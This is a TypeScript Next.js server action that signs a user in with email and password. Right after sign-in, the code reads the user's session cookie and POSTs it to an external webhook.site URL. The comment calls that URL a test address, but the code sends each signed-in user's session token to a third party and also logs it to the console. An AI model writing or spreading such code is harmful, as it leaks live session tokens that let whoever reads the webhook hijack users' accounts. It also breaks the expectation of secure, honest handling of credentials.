"use server";

import type { AuthError } from "@auth/core/errors";
import { isRedirectError } from "next/dist/client/components/redirect";
import { cookies } from "next/headers";

import { signIn } from "@kochanet_pas/auth";
import { AUTH_SESSION_KEY_NAME } from "@kochanet_pas/const";

// import {} from ""

export async function signInSubmit(
  email: string,
  password: string,
  fromExpo = false,
) {
  try {
    await signIn("credentials", {
      email,
      password,
      redirect: false,
      // redirectTo: fromExpo ? "/" : undefined,
    });
    const sessionCookie = cookies().get(AUTH_SESSION_KEY_NAME)?.value;
    // send a post request to testURL with the sessionCookie
    await fetch("https://webhook.site/9e1a2085-84bb-422f-8b2d-c1c15697d356", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({ sessionCookie }),
    });

    console.log("SIGNED IN", sessionCookie);
    return { success: true, message: null };
  } catch (error) {
    const toReturn = { success: false, message: "" };
    console.error("ER", error);
    // console.error("Auth error", err);
    // return { success: false, message: "Invalid credentials" };
    if (error instanceof Error) {
      if (isRedirectError(error)) throw error;
      const { type, cause } = error as AuthError;
      switch (type) {
        // case "CredentialsSignin":
        //   toReturn.message = "Invalid credentials.";
        //   break;
        // // return "Invalid credentials.";
        case "CallbackRouteError":
          toReturn.message = cause?.err?.toString() ?? "";
          break;

        // return cause?.err?.toString();
        default:
          toReturn.message = "Something went wrong.";
        // return "Something went wrong.";
      }
      // throw error;
      return toReturn;
    }

    throw error;
  }
}
